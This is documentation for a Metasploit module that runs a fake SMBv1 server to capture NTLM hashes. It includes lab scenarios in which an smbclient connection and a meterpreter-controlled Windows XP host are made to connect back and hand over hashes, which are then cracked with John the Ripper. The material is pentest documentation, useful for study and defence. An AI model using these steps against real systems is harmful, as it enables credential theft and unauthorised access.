This module creates a mock SMBv1 server which accepts credentials before returning `NT_STATUS_LOGON_FAILURE`.

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/server/capture/smb```
  3. Do: ```run```

## Options

  **CAINPWFILE**

  A file to store Cain & Abel formatted captured hashes in

  **CHALLENGE**

  An 8 byte server challenge.  Default is `1122334455667788`

  **JOHNPWFILE**

  A file to store John the Ripper formatted hashes in

## Scenarios

### Linux Connection via smbclient

Based on [shellvoide.com](https://www.shellvoide.com/hacks/how-to-setup-rogue-fake-smb-server-to-capture-credentials/)

You'll need to set `client use spnego = no` under `[global]` in `smb.conf` to ensure SMBv1 compatability.

Server:

```
msf5 exploit(multi/handler) > use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/smb) > set johnpwfile /tmp/john
johnpwfile => /tmp/john
msf5 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.
[*] SMB Captured - 2019-09-25 22:44:04 -0400
NTLMv2 Response Captured from 192.168.2.142:50978 - 192.168.2.142
USER:ubuntu DOMAIN:WORKGROUP OS:Unix LM:Samba
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:a6b70b49c8d42903fbe6231ce53a21ff 
NT_CLIENT_CHALLENGE:01010000000000008aee33441474d501f8f62d51f6995359000000000200120057004f0052004b00470052004f005500500000000000
[*] SMB Capture - Empty hash captured from 192.168.2.142:50978 - 192.168.2.142 captured, ignoring ... 
```

Client:

```
root@rageKali:~# grep spnego /etc/samba/smb.conf 
client use spnego = no
root@rageKali:~# smbclient //1.1.1.1/fake
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

Crack the Hash:

```
# cat /tmp/john_netntlmv2
ubuntu::WORKGROUP:1122334455667788:a6b70b49c8d42903fbe6231ce53a21ff:01010000000000008aee33441474d501f8f62d51f6995359000000000200120057004f0052004b00470052004f005500500000000000
# john /tmp/john_netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (ubuntu)
1g 0:00:00:00 DONE (2019-09-25 22:46) 11.11g/s 1865Kp/s 1865Kc/s 1865KC/s 24782478..playpen
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed

```

### Windows XP via net use

Based off of [hackers-arise.com](https://www.hackers-arise.com/single-post/2018/11/19/Metasploit-Basics-Part-20-Creating-a-Fake-SMB-Server-to-Capture-Credentials)

The idea here is we have a shell on a Windows box where we can't `hashdump` due to user permissions.
However, we're able to do a `net use` to make an `SMB` connection back to our server to get the
user's hash, then hopefully crack it.

```
meterpreter > getuid
Server username: WINXP\test
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/smb) > set johnpwfile /tmp/john
johnpwfile => /tmp/john
msf5 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/smb) > 
[*] Started service listener on 0.0.0.0:445 
[*] Server started.

msf5 auxiliary(server/capture/smb) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 892 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\test\Desktop>net use \\1.1.1.1 fake

[*] SMB Captured - 2019-09-25 22:26:04 -0400
NTLMv1 Response Captured from 2.2.2.2:1056 - 2.2.2.2
USER:test DOMAIN:WINXP OS:Windows 2002 Service Pack 2 2600 LM:Windows 2002 5.1
LMHASH:7f1a8bbdf965d969339b08f160d292692f85252cc731bb25
NTHASH:e02333eb6ac047b8d4d4f5759b1a455161d4bc576f75460c
net use \\1.1.1.1 fake
System error 1326 has occurred.

Logon failure: unknown user name or bad password.


C:\Documents and Settings\test\Desktop>
```

We're now able to use John the Ripper to crack the password.

```
# cat /tmp/john_netntlm 
test::WINXP:7f1a8bbdf965d969339b08f160d292692f85252cc731bb25:e02333eb6ac047b8d4d4f5759b1a455161d4bc576f75460c:1122334455667788
# john /tmp/john_netntlm --format=netlm  --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Using default target encoding: CP850
Loaded 1 password hash (netlm, LM C/R [DES 32/64])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
FAKE             (test)
1g 0:00:00:00 DONE (2019-09-25 22:28) 1.333g/s 1398Kp/s 1398Kc/s 1398KC/s 123456..LATISHA1
Use the "--show --format=netlm" options to display all of the cracked passwords reliably
Session completed
```
